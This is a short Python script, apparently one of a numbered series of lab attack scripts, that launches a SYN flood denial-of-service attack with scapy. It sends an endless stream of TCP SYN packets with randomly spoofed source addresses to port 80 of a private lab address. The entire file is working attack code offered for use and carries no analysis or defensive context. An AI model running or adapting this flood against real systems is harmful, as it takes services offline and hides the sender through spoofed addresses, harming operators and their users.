#!/usr/bin/env python3
# Attack 4: SYN Flood DDoS
# Run from: internet
# Usage: python3 syn_flood.py

from scapy.all import *
import random

TARGET_IP = "10.12.0.10"
TARGET_PORT = 80

def syn_flood():
    print(f"[*] Starting SYN flood on {TARGET_IP}:{TARGET_PORT}")
    count = 0
    while True:
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        pkt = IP(src=src_ip, dst=TARGET_IP) / TCP(
            sport=random.randint(1024,65535),
            dport=TARGET_PORT,
            flags="S"
        )
        send(pkt, verbose=0)
        count += 1
        if count % 500 == 0:
            print(f"  [+] Sent {count} packets so far...")

if __name__ == "__main__":
    syn_flood()
